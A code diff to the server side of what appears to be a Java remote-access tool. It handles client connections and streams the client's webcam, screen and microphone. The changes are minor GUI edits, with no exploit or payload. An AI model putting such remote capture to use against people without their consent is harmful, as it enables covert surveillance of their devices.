@@ -9,6 +9,7 @@ import br.com.introcdc.connect.server.components.ServerControlComponents;
 import br.com.introcdc.connect.server.components.ServerFileComponents;
 import br.com.introcdc.connect.server.components.ServerImageComponents;
 import br.com.introcdc.connect.server.components.settings.FileInfo;
+import br.com.introcdc.connect.server.gui.InteractiveImagePanel;
 import br.com.introcdc.connect.server.gui.ServerGUI;
 import com.google.gson.JsonObject;
 
@@ -137,7 +138,6 @@ public class ClientHandler implements Runnable {
                     String info = command.replace("connect:", "");
                     String[] args = info.split("\\|");
                     if (args.length != 4) {
-                        System.out.println("DEBUG COMANDO INCORRETO: '" + command + "', args.length: " + args.length);
                         closeConnection("Conexão com o cliente " + getClientIP() + " não identificada! (" + this.location + ")");
                         ServerAudioComponents.generateBeep(100, 250, true);
                         break;
@@ -233,7 +233,7 @@ public class ClientHandler implements Runnable {
                     }
                     new Thread(() -> {
                         boolean first = true;
-                        JLabel label = null;
+                        InteractiveImagePanel label = null;
                         try {
                             while ((!view && ((webcam && webcamLive) || (!webcam && screenLive))) || first) {
                                 try (Socket clientSocket = view ? viewSockets.take() : (webcam ? webcamSockets.take() : screenSockets.take());
@@ -321,6 +321,9 @@ public class ClientHandler implements Runnable {
                                     return;
                                 }
                                 ServerAudioComponents.AUDIO_USER = true;
+                                if (ServerGUI.AUDIO_USER != null) {
+                                    ServerGUI.toggleColor(ServerGUI.AUDIO_USER, true);
+                                }
                             } else {
                                 microphone = getTargetDataLine();
                                 if (microphone == null) {
@@ -328,6 +331,9 @@ public class ClientHandler implements Runnable {
                                     return;
                                 }
                                 ServerAudioComponents.AUDIO_SERVER = true;
+                                if (ServerGUI.AUDIO_SERVER != null) {
+                                    ServerGUI.toggleColor(ServerGUI.AUDIO_SERVER, true);
+                                }
                             }
 
                             SourceDataLine speakersInfo = speakers;
